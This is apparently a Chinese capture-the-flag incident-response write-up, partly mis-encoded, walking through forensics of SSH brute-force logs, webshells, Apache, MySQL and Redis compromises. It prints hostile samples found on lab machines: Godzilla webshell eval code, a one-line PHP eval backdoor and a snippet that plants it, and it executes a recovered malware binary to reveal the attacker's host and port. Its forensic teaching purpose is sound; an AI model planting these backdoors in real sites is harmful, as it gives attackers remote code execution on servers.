 1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;video&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;plugdev&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;netdev&#x27;Aug  1 08:18:27 ip-172-31-37-190 passwd[493]: password for &#x27;debian&#x27; changed by &#x27;root&#x27;Aug  1 08:18:27 ip-172-31-37-190 sudo:     root : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/usr/bin/touch /var/log/aws114_ssm_agent_installation.logAug  1 08:18:27 ip-172-31-37-190 sudo: pam_unix(sudo:session): session opened for user root by (uid=0)Aug  1 08:18:27 ip-172-31-37-190 sudo: pam_unix(sudo:session): session closed for user rootAug  1 08:18:27 ip-172-31-37-190 sshd[544]: Server listening on 0.0.0.0 port 22.Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: Watching system buttons on /dev/input/event1 (Power Button)Aug  1 08:18:27 ip-172-31-37-190 sshd[544]: Server listening on :: port 22.Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: Watching system buttons on /dev/input/event2 (Sleep Button)Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: Watching system buttons on /dev/input/event0 (AT Translated Set 2 keyboard)Aug  1 08:18:27 ip-172-31-37-190 systemd-logind[503]: New seat seat0.Jul 20 05:18:05 ip-10-0-10-2 passwd[418]: password for &#x27;debian&#x27; changed by &#x27;root&#x27;Jul 20 05:18:05 ip-10-0-10-2 systemd-logind[433]: Watching system buttons on /dev/input/event1 (Power Button)Jul 20 05:18:05 ip-10-0-10-2 sshd[452]: Server listening on 0.0.0.0 port 22.Jul 20 05:18:06 ip-10-0-10-2 sshd[452]: Server listening on :: port 22.Jul 20 05:18:06 ip-10-0-10-2 systemd-logind[433]: Watching system buttons on /dev/input/event2 (Sleep Button)Jul 20 05:18:06 ip-10-0-10-2 systemd-logind[433]: Watching system buttons on /dev/input/event0 (AT Translated Set 2 keyboard)Jul 20 05:18:06 ip-10-0-10-2 systemd-logind[433]: New seat seat0.\n\nä¸€ä¸ªä¸€ä¸ªæ‰¾æ•ˆç‡å¤ªä½,æˆ‘ä»¬ç”¨grepè¿›è¡Œæ­£åˆ™åŒ¹é…\næœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºsshçš„rootå¸å·ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²cat /var/log/auth.log.1|grep -a &quot;Failed password for root&quot;\n\nAug  1 07:42:32 linux-rz sshd[7471]: Failed password for root from 192.168.200.32 port 51888 ssh2Aug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2Aug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2Aug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2Aug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2Aug  1 07:52:59 linux-rz sshd[7606]: Failed password for root from 192.168.200.31 port 40364 ssh2\n\næŠŠipåˆ—å‡ºæ¥\n192.168.200.32192.168.200.2192.168.200.31é‚£ä¹ˆflagå°±æ˜¯flag&#123;192.168.200.2,192.168.200.31,192.168.200.32&#125;\n\nsshçˆ†ç ´æˆåŠŸç™»é™†çš„IPæ˜¯å¤šå°‘ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²æ‰¾Accepted passwordå³å¯\ncat /var/log/auth.log.1|grep -a &quot;Accepted password for root&quot;\n\nAug  1 07:47:23 linux-rz sshd[7505]: Accepted password for root from 192.168.200.2 port 46563 ssh2Aug  1 07:50:37 linux-rz sshd[7539]: Accepted password for root from 192.168.200.2 port 48070 ssh2\n\né‚£ä¹ˆflagå°±æ˜¯\nflag&#123;192.168.200.2&#125;\n\nçˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨â€,â€åˆ†å‰²æ‰¾ç™»å½•é”™è¯¯çš„å³å¯\ncat /var/log/auth.log.1|grep -a &quot;Failed password&quot;\n\nAug  1 07:40:50 linux-rz sshd[7461]: Failed password for invalid user test1 from 192.168.200.35 port 33874 ssh2Aug  1 07:41:04 linux-rz sshd[7465]: Failed password for invalid user test2 from 192.168.200.35 port 51640 ssh2Aug  1 07:41:13 linux-rz sshd[7468]: Failed password for invalid user test3 from 192.168.200.35 port 48168 ssh2Aug  1 07:42:32 linux-rz sshd[7471]: Failed password for root from 192.168.200.32 port 51888 ssh2Aug  1 07:46:41 linux-rz sshd[7475]: Failed password for invalid user user from 192.168.200.2 port 36149 ssh2Aug  1 07:46:47 linux-rz sshd[7478]: Failed password for invalid user user from 192.168.200.2 port 44425 ssh2Aug  1 07:46:50 linux-rz sshd[7480]: Failed password for invalid user user from 192.168.200.2 port 38791 ssh2Aug  1 07:46:54 linux-rz sshd[7482]: Failed password for invalid user user from 192.168.200.2 port 37489 ssh2Aug  1 07:46:56 linux-rz sshd[7484]: Failed password for invalid user user from 192.168.200.2 port 35575 ssh2Aug  1 07:46:59 linux-rz sshd[7486]: Failed password for invalid user hello from 192.168.200.2 port 35833 ssh2Aug  1 07:47:02 linux-rz sshd[7489]: Failed password for invalid user hello from 192.168.200.2 port 37653 ssh2Aug  1 07:47:04 linux-rz sshd[7491]: Failed password for invalid user hello from 192.168.200.2 port 37917 ssh2Aug  1 07:47:08 linux-rz sshd[7493]: Failed password for invalid user hello from 192.168.200.2 port 41957 ssh2Aug  1 07:47:10 linux-rz sshd[7495]: Failed password for invalid user hello from 192.168.200.2 port 39685 ssh2Aug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2Aug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2Aug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2Aug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2Aug  1 07:47:26 linux-rz sshd[7525]: Failed password for invalid user  from 192.168.200.2 port 37013 ssh2Aug  1 07:47:30 linux-rz sshd[7528]: Failed password for invalid user  from 192.168.200.2 port 37545 ssh2Aug  1 07:47:32 linux-rz sshd[7530]: Failed password for invalid user  from 192.168.200.2 port 39111 ssh2Aug  1 07:47:35 linux-rz sshd[7532]: Failed password for invalid user  from 192.168.200.2 port 35173 ssh2Aug  1 07:47:39 linux-rz sshd[7534]: Failed password for invalid user  from 192.168.200.2 port 45807 ssh2Aug  1 07:52:59 linux-rz sshd[7606]: Failed password for root from 192.168.200.31 port 40364 ssh2\n\næˆ‘ä»¬è¦foråˆ°fromä¹‹é—´çš„å­—ç¬¦ä¸²,å†æ¬¡è¿‡æ»¤\ncat /var/log/auth.log.1|grep -a &quot;Failed password&quot;|grep -o &#x27;for .*from&#x27;|uniq -c|sort -nr\n\n      5 for invalid user user from      5 for invalid user hello from      5 for invalid user  from      4 for root from      1 for root from      1 for root from      1 for invalid user test3 from      1 for invalid user test2 from      1 for invalid user test1 fromflag&#123;user,hello,root,test3,test2,test1&#125;\n\nè¿™é‡Œsort -nr:\n\n-nï¼šæŒ‰æ•°å­—æ’åºï¼ˆæ¬¡æ•°ï¼‰ã€‚\n-rï¼šé™åºæ’åˆ—ï¼ˆæœ€é«˜é¢‘æ¬¡åœ¨å‰ï¼‰ã€‚\n\nuniq -c:ç»Ÿè®¡é‡å¤è¡Œçš„æ¬¡æ•°\nç™»é™†æˆåŠŸçš„IPå…±çˆ†ç ´äº†å¤šå°‘æ¬¡å‰é¢çŸ¥é“åªæœ‰192.168.200.2ç™»å½•æˆåŠŸ,æ‰¾ä»–å³å¯\ncat /var/log/auth.log.1|grep -a &quot;192.168.200.2&quot;|grep &quot;for root&quot;\n\nAug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2Aug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2Aug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2Aug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2Aug  1 07:47:23 linux-rz sshd[7505]: Accepted password for root from 192.168.200.2 port 46563 ssh2Aug  1 07:50:37 linux-rz sshd[7539]: Accepted password for root from 192.168.200.2 port 48070 ssh2\n\nå¤±è´¥å››æ¬¡,flag{4}\né»‘å®¢ç™»é™†ä¸»æœºåæ–°å»ºäº†ä¸€ä¸ªåé—¨ç”¨æˆ·ï¼Œç”¨æˆ·åæ˜¯å¤šå°‘cat /var/log/auth.log.1|grep -a &quot;new user&quot;\n\nAug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/shAug  1 08:18:27 ip-172-31-37-190 useradd[487]: new user: name=debian, UID=1001, GID=1001, home=/home/debian, shell=/bin/bash\n\nflag{test2}\nç¬¬ä¸€ç«  åº”æ€¥å“åº”-webshellæŸ¥æ€é¶æœºè´¦å·å¯†ç  root xjwebshell1.é»‘å®¢webshellé‡Œé¢çš„flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;2.é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell githubåœ°å€çš„md5 flag&#123;md5&#125;3.é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5 flag&#123;md5&#125; æ³¨ : /xxx/xxx/xxx/xxx/xxx.xxx4.é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„ md5 flag&#123;md5&#125;\n\nç™»è¿›å»åå…ˆæŠŠwebç›®å½•ä¸‹çš„æ–‡ä»¶dumpä¸‹æ¥\ntar -czvf html.tar.gz -C /var/www/html \n\nç„¶åç”¨dç›¾æ‰«ä¸€ä¸‹\né»‘å®¢webshellé‡Œé¢çš„flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}åœ¨D:\\Problems\\webshell\\var\\www\\html\\include\\gz.phpä¸Šæ‰¾åˆ°flag\n\nflag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;\n\né»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell githubåœ°å€çš„md5 flag{md5}ç›´æ¥æŠŠå¦‚ä¸‹ä»£ç æ”¾åœ¨githubé‡Œæœ\nif ($data!==false)&#123;    $data=encode($data,$key);    if (isset($_SESSION[$payloadName]))&#123;        $payload=encode($_SESSION[$payloadName],$key);        if (strpos($payload,&quot;getBasicsInfo&quot;)===false)&#123;            $payload=encode($payload,$key);        &#125;\t\teval($payload);        echo encode(@run($data),$key);    &#125;else&#123;        if (strpos($data,&quot;getBasicsInfo&quot;)!==false)&#123;            $_SESSION[$payloadName]=encode($data,$key);        &#125;    &#125;&#125;\n\n\nå‘ç°æ˜¯å“¥æ–¯æ‹‰çš„webshell,githubåœ°å€ä¸ºhttps://github.com/BeichenDream/Godzilla\nflag&#123;39392de3218c333f794befef07ac9257&#125;\n\né»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5 flag{md5} æ³¨ : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx\nmysqli.php\n/var/www/html/include/Db/.Mysqli.phpflag&#123;aebac0e58cd6c5fad1695ee4d1ac1919&#125;\n\né»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„ md5 flag{md5}id      çº§åˆ«  å¤§å°       CRC        ä¿®æ”¹æ—¶é—´             æ–‡ä»¶ (è¯´æ˜) -------------------------------------------------------------------------------------------------------------------------------------------- 00001   4     38         FEE1C229   23-08-02 10:52:25    \\html\\shell.php     ã€Evalåé—¨ &#123;å‚æ•°:$_REQUEST[1]&#125;ã€ 00002   4     808        3F54B485   23-08-02 10:56:39    \\html\\include\\gz.php  ã€(å†…è—)Evalåé—¨ &#123;å‚æ•°:encode($_SESSION[$payloadName],&quot;3c6e0b8a9c15224a&quot;)&#125;ã€ 00003   3     205        D6CF6AC8   23-08-02 16:56:29    \\html\\wap\\top.php   ã€å˜é‡å‡½æ•°[$c($fun)]|å¯ç–‘æ–‡ä»¶ã€ 00004   4     768        3DEFBD91   23-08-02 11:01:06    \\html\\include\\Db\\.Mysqli.php  ã€(å†…è—)Evalåé—¨ &#123;å‚æ•°:encode($_SESSION[$payloadName],&quot;3c6e0b8a9c15224a&quot;)&#125;ã€\n\nè¿™ä¸ªæ˜¯dç›¾æ‰«å‡ºæ¥çš„\n\nè¿™ä¸ªæ˜¯ç«ç»’æ‰¾å‡ºæ¥çš„,å·®äº†ä¸ªtop.php\n/var/www/html/wap/top.phpflag&#123;eeff2eabfd9b7a6d26fc1a53d3f7d1de&#125;\n\nç¬¬ä¸€ç«  åº”æ€¥å“åº”- Linuxå…¥ä¾µæ’æŸ¥è´¦å·ï¼šroot å¯†ç ï¼šlinuxruqinssh root@IP1.webç›®å½•å­˜åœ¨æœ¨é©¬ï¼Œè¯·æ‰¾åˆ°æœ¨é©¬çš„å¯†ç æäº¤2.æœåŠ¡å™¨ç–‘ä¼¼å­˜åœ¨ä¸æ­»é©¬ï¼Œè¯·æ‰¾åˆ°ä¸æ­»é©¬çš„å¯†ç æäº¤3.ä¸æ­»é©¬æ˜¯é€šè¿‡å“ªä¸ªæ–‡ä»¶ç”Ÿæˆçš„ï¼Œè¯·æäº¤æ–‡ä»¶å4.é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢çš„æœåŠ¡å™¨ipæäº¤5.é»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢æœåŠ¡å™¨å¼€å¯çš„ç›‘ç«¯å£æäº¤\n\ndumpä¸‹æ¥ç»™ç«ç»’æŸ¥æ€\n\nwebç›®å½•å­˜åœ¨æœ¨é©¬ï¼Œè¯·æ‰¾åˆ°æœ¨é©¬çš„å¯†ç æäº¤\nflag&#123;1&#125;\n\næœåŠ¡å™¨ç–‘ä¼¼å­˜åœ¨ä¸æ­»é©¬ï¼Œè¯·æ‰¾åˆ°ä¸æ­»é©¬çš„å¯†ç æäº¤åˆ›å»º.ç¬¦å·å¼€å¤´ä¹Ÿå¾ˆæ˜ç¡®äº†ï¼Œå°±æ˜¯ä¸ºäº†åˆ›å»ºéšè—webshellè¿æ¥æœ¨é©¬\n&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;\n\nPOSTä¼ è¿›æ¥çš„md5çš„é‚£ä¸€å¤§ä¸²è½¬ä¸ºå­—ç¬¦ä¸²ä¸ºhelloæ•…flagå°±æ‰¾åˆ°äº†\nflag&#123;hello&#125;\n\nä¸æ­»é©¬æ˜¯é€šè¿‡å“ªä¸ªæ–‡ä»¶ç”Ÿæˆçš„ï¼Œè¯·æäº¤æ–‡ä»¶ååœ¨index.phpé‡Œçœ‹åˆ°è¿™äº›ä¸œè¥¿ï¼š\n$file = &#x27;/var/www/html/.shell.php&#x27;;$code = &#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;;file_put_contents($file, $code);\n\nå¾ˆæ˜æ˜¾å°±æ˜¯é€šè¿‡index.phpç»™.shell.phpå†™ä¸æ­»é©¬\nflag&#123;index.php&#125;\n\né»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢çš„æœåŠ¡å™¨ipæäº¤è¿˜å‰©ä¸€ä¸ªshell.elfæ²¡å¤„ç†,linuxå¯æ‰§è¡Œæ–‡ä»¶,æˆ‘ä»¬åœ¨é¶æœºä¸Šå°è¯•æ‰§è¡Œä¸€ä¸‹\nå‘ç°æ²¡æœ‰ç”¨å¯æ‰§è¡Œæƒé™,åŠ ä¸Šxæƒé™å³å¯\nchmod +x shell\\(1\\).elf #æ‹¬å·è½¬ä¹‰./shell\\(1\\).elf &amp; # &#x27;&amp;&#x27; æŠŠæ–‡ä»¶æ”¾åœ¨åå°æ‰§è¡Œ,ä¸é˜»å¡shell\n\nç„¶ånetstat -alntupçœ‹ä¸€ä¸‹è¿æ¥æƒ…å†µ\n\nflag&#123;10.11.55.21&#125;\n\né»‘å®¢ç•™ä¸‹äº†æœ¨é©¬æ–‡ä»¶ï¼Œè¯·æ‰¾å‡ºé»‘å®¢æœåŠ¡å™¨å¼€å¯çš„ç›‘ç«¯å£æäº¤ä¸Šä¸€é¢˜å¯çŸ¥\nflag&#123;3333&#125;\n\nç¬¬ä¸€ç«  æ—¥å¿—åˆ†æ-apacheæ—¥å¿—åˆ†æ1ã€æäº¤å½“å¤©è®¿é—®æ¬¡æ•°æœ€å¤šçš„IPï¼Œå³é»‘å®¢IPï¼š2ã€é»‘å®¢ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹æ˜¯ä»€ä¹ˆï¼Œæäº¤æŒ‡çº¹çš„md5ï¼š3ã€æŸ¥çœ‹åŒ…å«index.phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°ï¼Œæäº¤æ¬¡æ•°ï¼š4ã€æŸ¥çœ‹é»‘å®¢IPè®¿é—®äº†å¤šå°‘æ¬¡ï¼Œæäº¤æ¬¡æ•°ï¼š5ã€æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼Œæäº¤æ¬¡æ•°:\n\næäº¤å½“å¤©è®¿é—®æ¬¡æ•°æœ€å¤šçš„IPï¼Œå³é»‘å®¢IPï¼šé”™è¯¯æ—¥å¿—è·¯å¾„åœ¨/var/log/apache2/error.log.1ä¸‹ï¼Œ\n\nç›´æ¥å°±èƒ½çœ‹å‡ºipæ˜¯192.168.200.2\nflag&#123;192.168.200.2&#125;\n\né»‘å®¢ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹æ˜¯ä»€ä¹ˆï¼Œæäº¤æŒ‡çº¹çš„md5ï¼šç»“åˆaccess.log.1é‡Œçš„å†…å®¹ä¸€èµ·çœ‹ï¼Œä»¥æ—¶é—´æˆ³[Thu Aug 03 08:46:44.388147 2023]ä¸ºä¾‹å­æ‰¾åˆ°å¯¹åº”\ncat 1.txt | grep -a &quot;08:46:44&quot;\n\n\nflag&#123;2d6330f380f44ac20f3a02eed0958f66&#125;\n\næŸ¥çœ‹åŒ…å«index.phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°ï¼Œæäº¤æ¬¡æ•°ï¼šåœ¨access.log.1é‡Œç›´æ¥çœ‹\nroot@ip-10-0-10-2:/var/log/apache2# cat 1.txt | grep -a &quot;/index.php&quot; | sort | uniq -c | sort -nr|wc -l27\n\nflag&#123;27&#125;\n\næŸ¥çœ‹é»‘å®¢IPè®¿é—®äº†å¤šå°‘æ¬¡ï¼Œæäº¤æ¬¡æ•°ï¼šgrep -Ea &quot;^192.168.200.2 - -&quot; /var/log/apache2/access.log.1 | wc -l6555\n\n\nflag&#123;6555&#125;\n\næŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼Œæäº¤æ¬¡æ•°:grep -Ea &quot;^[0-9]+.*+03/Aug/2023:[08|09]&quot; /var/log/apache2/access.log.1 | awk &#x27;&#123;print $1&#125;&#x27; | uniq -c | wc -lroot@ip-10-0-10-3:/var/log/apache2# grep -Ea &quot;^[0-9]+.*+03/Aug/2023:[08|09]&quot; /var/log/apache2/access.log.1 | awk &#x27;&#123;print $1&#125;&#x27; | uniq -c | wc -l5\n\nflag&#123;5&#125;\n\nç¬¬ä¸€ç« æ—¥å¿—åˆ†æ-mysqlåº”æ€¥å“åº”é»‘å®¢ç¬¬ä¸€æ¬¡å†™å…¥çš„shellåœ¨webç›®å½•ä¸‹å‘ç°sh.php\n\nflag&#123;ccfda79e-7aa1-4275-bc26-a6189eb9a20b&#125;\n\né»‘å®¢åå¼¹shellçš„ipéœ€è¦åˆ°mysqlçš„æŠ¥é”™æ—¥å¿—ä¸‹\n/var/log/mysql/error.log\n\n\nå‘ç°ä¸€ä¸ªå¯ç–‘çš„/tmp/1.shæ–‡ä»¶\n\nflag&#123;192.168.100.13&#125;\n\né»‘å®¢ææƒæ–‡ä»¶çš„å®Œæ•´è·¯å¾„é¦–å…ˆè¦çŸ¥é“mysqlææƒçš„å‡ ç§æ–¹å¼\n\nUDF ææƒ\nMOFææƒ\nå¯åŠ¨é¡¹ææƒ\nCVE-2016-6663\n\nå…¶ä¸­ï¼Œ2ï¼Œ3éƒ½æ˜¯åœ¨windowsç¯å¢ƒä¸‹æ‰èƒ½è¿›è¡Œï¼Œæ•…æ’é™¤ï¼Œ4éœ€è¦ MariaDB &lt;&#x3D; 5.5.51 æˆ– 10.0.x &lt;&#x3D; 10.0.27 æˆ– 10.1.x &lt;&#x3D; 10.1.17ï¼Œè€Œæˆ‘ä»¬ç¯å¢ƒçš„ MariaDB ç‰ˆæœ¬ä¸º 5.5.64ï¼Œä¸åœ¨æ­¤æ¼æ´çš„å½±å“ç‰ˆæœ¬å†…ï¼Œä¹Ÿå¯ä»¥æ’é™¤æ‰\nUDFææƒçš„æ–‡ç« ï¼šhttps://hilang.cloud/mysql-%e6%8f%90%e6%9d%83/\nUDF ææƒæ˜¯åŸºäºè‡ªå®šä¹‰å‡½æ•°å®ç°çš„ï¼Œè€Œè‡ªå®šä¹‰å‡½æ•°çš„å‰ææ˜¯ UDF çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶æ”¾ç½®äº MySQL å®‰è£…ç›®å½•ä¸‹çš„lib\\pluginæ–‡ä»¶å¤¹ï¼Œæ•…æˆ‘ä»¬éœ€è¦ç™»å½• Mysql å¯¹ plugin å…³é”®å­—è¿›è¡Œæ’æŸ¥ï¼Œåœ¨webç›®å½•ä¸‹çš„common.phpå‘ç°mysqlè¿æ¥çš„è´¦å·å¯†ç \nroot@xuanji:/var/log/mysql# cat /var/www/html/common.php&lt;?php$conn=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;334cc35b3c704593&quot;,&quot;cms&quot;,&quot;3306&quot;);if(!$conn)&#123;echo &quot;æ•°æ®åº“è¿æ¥å¤±è´¥&quot;;&#125;\n\nè¿æ¥mysql\nmysql -uroot -p334cc35b3c704593\n\nä¹‹åå¯¹ plugin å…³é”®è¯è¿›è¡Œæ’æŸ¥ï¼Œæ˜¾ç¤ºæ‰€æœ‰ä¸ plugin ç›¸å…³çš„ç³»ç»Ÿå˜é‡\nshow variables like &#x27;%plugin%&#x27;;\n\n\n\nç¡®å®å­˜åœ¨udf.soæ–‡ä»¶ï¼Œæ–‡ä»¶è·¯å¾„/usr/lib/mysql/plugin/udf.so\nflag&#123;b1818bde4e310f3d23f1005185b973e7&#125;\n\né»‘å®¢è·å–çš„æƒé™ä½¿ç”¨ps -auxæŸ¥çœ‹è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°ææƒæ–‡ä»¶çš„è¿è¡Œåçš„æƒé™ä¸ºmysqlï¼Œæ•… Flag ä¸º mysql\nflag&#123;mysql&#125;\n\nç¬¬äºŒç« æ—¥å¿—åˆ†æ-redisåº”æ€¥å“åº”åˆ†æé»‘å®¢æ”»å‡»æˆåŠŸçš„ IP ä¸ºå¤šå°‘å…ˆåˆ†æredisæ—¥å¿—ï¼Œè·¯å¾„/var/log/redis.log\n\nflag&#123;192.168.100.20&#125;\n\nåˆ†æé»‘å®¢ç¬¬ä¸€æ¬¡ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶åˆ†ææ—¥å¿—\n\nå‘ç°æœ‰ä¸ª.&#x2F;exp.so\ncat /exp.so | grep -a &quot;flag&#123;&quot;\n\n\nflag&#123;XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b&#125;\n\nåˆ†æé»‘å®¢åå¼¹ shell çš„IP ä¸ºå¤šå°‘å¯¹äºredisæ•°æ®åº“ææƒä¸€èˆ¬æ¥è¯´æœ‰4ç§æ–¹æ³•\n\nå†™å¯†é’¥ssh\nè®¡åˆ’ä»»åŠ¡\nåå¼¹shell\nCVE-2022-0543 æ²™ç›’ç»•è¿‡å‘½ä»¤æ‰§è¡Œ ï¼ˆé›†æˆåœ¨templateå½“ä¸­ï¼‰\n\nè¿™é‡Œé¢å¯ä»¥å…ˆæ’é™¤åå¼¹shellä¸CVE-2022-0543 å› ä¸ºåå¼¹shellå¾ˆå®¹æ˜“å‡ºé—®é¢˜å¯¼è‡´è¿æ¥å¤±è´¥ã€‚\nå…ˆçœ‹ä¸‹æœ‰æ²¡æœ‰å†™å…¬é’¥\ncat /root/.ssh/authorized_keys\n\n\nå¯ä»¥çœ‹åˆ°æ˜¯å†™äº†å…¬é’¥çš„ã€‚ä½†ä»…é å…¬é’¥æˆ‘ä»¬æ˜¯æ‰¾ä¸åˆ°åå¼¹Ipçš„\nå†æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡\ncrontab -l\n\n\nflag&#123;192.168.100.13&#125;\n\næº¯æºåˆ†æé»‘å®¢çš„ç”¨æˆ·åï¼Œå¹¶ä¸”æ‰¾åˆ°é»‘å®¢ä½¿ç”¨çš„å·¥å…·é‡Œçš„å…³é”®å­—ç¬¦ä¸²ç”±ä¸Šä¸€æ­¥å·²ç»å¾—çŸ¥ç”¨æˆ·åä¸ºxj-test-user\nç”¨ç”¨æˆ·åå»githubé‡Œé¢æœç´¢https://github.com/xj-test-user/redis-rogue-getshell\n\nflag&#123;xj-test-user-wow-you-find-flag&#125;\n\nåˆ†æé»‘å®¢ç¯¡æ”¹çš„å‘½ä»¤å¤§å¤šæ•°Linuxå‘½ä»¤éƒ½æ˜¯ç¼–è¯‘åçš„äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶\nè¿™äº›å¯æ‰§è¡Œæ–‡ä»¶ä¸€èˆ¬æ”¾ç½®äº &#x2F;binã€&#x2F;sbinã€&#x2F;usr&#x2F;binã€&#x2F;usr&#x2F;sbin ç­‰ç›®å½•ä¸­\næˆ‘ä»¬åˆ°&#x2F;binç›®å½• æŒ‰ç…§æ—¶é—´é¡ºåºæŸ¥çœ‹æœ€æ–°çš„æ–‡ä»¶\ncat /bin/ps\n\n\nflag&#123;c195i2923381905517d818e313792d196&#125;\n\n","categories":["åº”æ€¥å“åº”"],"tags":["åº”æ€¥å“åº”"]}]